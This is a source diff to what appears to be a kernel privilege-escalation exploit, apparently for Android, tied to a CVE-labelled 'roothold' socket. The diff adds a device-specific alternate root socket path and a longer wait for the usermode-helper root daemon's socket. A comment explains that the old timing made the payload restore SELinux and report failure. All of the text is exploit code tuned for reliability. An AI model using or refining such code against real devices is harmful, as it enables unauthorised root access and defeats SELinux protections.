@@ -7,7 +7,11 @@ int root_child_done;
 uint32_t root_uid_before = 0xffffffff;
 uint32_t root_uid_after = 0xffffffff;
 
+#ifdef X818_ALT_SOCKET
+#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su_x818.sock"
+#else
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
+#endif
 #define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
 
 struct umh_subprocess_info {
@@ -490,13 +494,26 @@ static int install_workqueue_umh_root(int fd) {
   }
   int32_t umh_retval = (int32_t)retval_value;
   if (complete_done) {
-    for (int i = 0; i < 200; i++) {
+#if defined(X818_SOCKET_WAIT) || defined(X818_ALT_SOCKET)
+    /*
+     * On X818U the kernel workqueue can report completion before the
+     * usermode helper has finished creating its filesystem socket.  The
+     * old two-second window caused a false negative: the root daemon was
+     * left running, but the payload restored SELinux and returned failure.
+     */
+    const int socket_wait_polls = 3000;
+#else
+    const int socket_wait_polls = 200;
+#endif
+    for (int i = 0; i < socket_wait_polls; i++) {
       if (root_socket_ready()) {
         socket_ok = 1;
         break;
       }
       usleep(10000);
     }
+    pr_info("root umh socket wait polls=%d ready=%d\n",
+            socket_wait_polls, socket_ok);
   }
 
   pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
